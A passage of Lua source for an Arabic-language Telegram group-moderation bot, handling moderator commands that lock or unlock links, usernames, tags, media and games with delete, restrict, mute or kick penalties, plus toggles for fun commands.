send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الروابط *')
end,nil)   
elseif text == 'سد الروابط بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الروابط بالتقييد *')
end,nil)   
elseif text == 'سد الروابط بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الروابط بالكتم *')
end,nil)   
elseif text == 'سد الروابط بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الروابط بالطرد *')
end,nil)   
elseif text == 'افتح الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Link"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الروابط *')
end,nil)   
end
if text == 'سد المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ المعرفات *')
end,nil)   
elseif text == 'سد المعرفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ المعرفات بالتقييد *')
end,nil)   
elseif text == 'سد المعرفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ المعرفات بالكتم *')
end,nil)   
elseif text == 'سد المعرفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ المعرفات بالطرد *')
end,nil)   
elseif text == 'افتح المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:user:name"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > المعـرفات بࢪو*')
end,nil)   
end
if text == 'تفعيل نسبه الحب' and Manager(msg) then   
if database:get(bot_id..'Cick:lov'..msg.chat_id_) then
Text = '* ⊀︰ تم تفعيل نسبه الحب*'
database:del(bot_id..'Cick:lov'..msg.chat_id_)  
else
Text = '* ⊀︰ بالتاكيد تم تفعيل نسبه الحب*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الحب' and Manager(msg) then  
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..'Cick:lov'..msg.chat_id_,true)  
Text = '\n *⊀︰ تم تعطيل نسبه الحب*'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل نسبه الحب*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الرجوله' and Manager(msg) then   
if database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
Text = '* ⊀︰ تم تفعيل نسبه الرجوله*'
database:del(bot_id..'Cick:rjo'..msg.chat_id_)  
else
Text = '* ⊀︰ بالتاكيد تم تفعيل الرجوله*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الرجوله' and Manager(msg) then  
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..'Cick:rjo'..msg.chat_id_,true)  
Text = '\n *⊀︰ تم تعطيل نسبه الرجوله*'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل نسبه الرجوله*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الكره' and Manager(msg) then   
if database:get(bot_id..'Cick:krh'..msg.chat_id_) then
Text = '* ⊀︰ تم تفعيل نسبه الكره*'
database:del(bot_id..'Cick:krh'..msg.chat_id_)  
else
Text = '* ⊀︰ بالتاكيد تم تفعيل نسبه الكره*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الكره' and Manager(msg) then  
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..'Cick:krh'..msg.chat_id_,true)  
Text = '\n *⊀︰ تم تعطيل نسبه الكره*'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل نسبه الكره*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الانوثه' and Manager(msg) then   
if database:get(bot_id..'Cick:ano'..msg.chat_id_) then
Text = '* ⊀︰ تم تفعيل نسبه الانوثه*'
database:del(bot_id..'Cick:ano'..msg.chat_id_)  
else
Text = '* ⊀︰ بالتاكيد تم تفعيل الانوثه*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الانوثه' and Manager(msg) then  
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..'Cick:ano'..msg.chat_id_,true)  
Text = '\n *⊀︰ تم تعطيل نسبه الانوث*ه'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل نسبه الانوثه*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = '* ⊀︰ تم تفعيل امر @all*'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = '* ⊀︰ بالتاكيد تم تفعيل امر @all*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل all' and CoSu(msg) then  
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
database:set(bot_id..'Cick:all'..msg.chat_id_,true)  
Text = '\n *⊀︰ تعـطل امـر الـتاك @all*'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل امر @all*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل كول' and CoSu(msg) then   
if database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
Text = '* ⊀︰ تفـعلت بـس بربك مو تلـح..🦖*'
database:del(bot_id..'Speak:after:me'..msg.chat_id_)  
else
Text = '* ⊀︰ مـتفعل الامـر ولـحمزه..🕸️*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل كول' and CoSu(msg) then  
if not database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
database:set(bot_id..'Speak:after:me'..msg.chat_id_,true)  
Text = '\n *⊀︰ تم تعطيل امر كول*'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل امر كول*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل غنيلي' and CoSu(msg) then   
if database:get(bot_id..'sing:for:me'..msg.chat_id_) then
Text = '* ⊀︰ تم تفعيل امر غنيلي الان ارسل غنيلي*'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = '* ⊀︰ بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل غنيلي' and CoSu(msg) then  
if not database:get(bot_id..'sing:for:me'..msg.chat_id_) then
database:set(bot_id..'sing:for:me'..msg.chat_id_,true)  
Text = '\n *⊀︰ تم تعطيل امر غنيلي*'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل امر غنيلي*'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == 'سد التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الـتاك بࢪو*')
end,nil)   
elseif text == 'سد التاك بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ التاك بالتقييد *')
end,nil)   
elseif text == 'سد التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ التاك بالكتم *')
end,nil)   
elseif text == 'سد التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ التاك بالطرد *')
end,nil)   
elseif text == 'افتح التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:hashtak"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الـتاك بࢪو*')
end,nil)   
end
if text == 'سد الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الـشاࢪحه بࢪو*')
end,nil)   
elseif text == 'سد الشارحه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الشارحه بالتقييد *')
end,nil)   
elseif text == 'سد الشارحه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الشارحه بالكتم *')
end,nil)   
elseif text == 'سد الشارحه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الشارحه بالطرد *')
end,nil)   
elseif text == 'افتح الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Cmd"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الشارحـه بࢪو*')
end,nil)   
end
if text == 'سد الصور'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الصور بࢪو*')
end,nil)   
elseif text == 'سد الصور بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الصور بالتقييد *')
end,nil)   
elseif text == 'سد الصور بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الصور بالكتم *')
end,nil)   
elseif text == 'سد الصور بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الصور بالطرد *')
end,nil)   
elseif text == 'افتح الصور' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الصـور بࢪو*')
end,nil)   
end
if text == 'سد الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الفيـديو بࢪو*')
end,nil)   
elseif text == 'سد الفيديو بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الفيديو بالتقييد *')
end,nil)   
elseif text == 'سد الفيديو بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الفيديو بالكتم *')
end,nil)   
elseif text == 'سد الفيديو بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الفيديو بالطرد *')
end,nil)   
elseif text == 'افتح الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Video"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الفيـديو بࢪو*')
end,nil)   
end
if text == 'سد المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ المتحـركه بࢪو*')
end,nil)   
elseif text == 'سد المتحركه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ المتحركه بالتقييد *')
end,nil)   
elseif text == 'سد المتحركه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ المتحركه بالكتم *')
end,nil)   
elseif text == 'سد المتحركه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ المتحركه بالطرد *')
end,nil)   
elseif text == 'افتح المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Animation"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > المتحـركه بࢪو*')
end,nil)   
end
if text == 'سد الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الالعـاب بࢪو*')
end,nil)   
elseif text == 'سد الالعاب بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الالعاب بالتقييد *')
end,nil)   
elseif text == 'سد الالعاب بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الالعاب بالكتم *')
end,nil)   
elseif text == 'سد الالعاب بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الالعاب بالطرد *')
end,nil)   
elseif text == 'افتح الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:geam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الالعـاب بࢪو*')
end,nil)   
end
if text == 'سد الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الاغـاني بࢪو*')
end,nil)   
elseif text == 'سد الاغاني بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الاغاني بالتقييد *')
end,nil)   
elseif text == 'سد الاغاني بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الاغاني بالكتم *')
end,nil)   
elseif text == 'سد الاغاني بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الاغاني بالطرد *')
end,nil)   
elseif text == 'افتح الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Audio"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الاغاني *')
end,nil)   
end
if text == 'سد الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الصـوت بࢪو*')
end,nil)   
elseif text == 'سد الصوت بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الصوت بالتقييد *')
end,nil)   
elseif text == 'سد الصوت بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الصوت بالكتم *')
end,nil)   
elseif text == 'سد الصوت بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
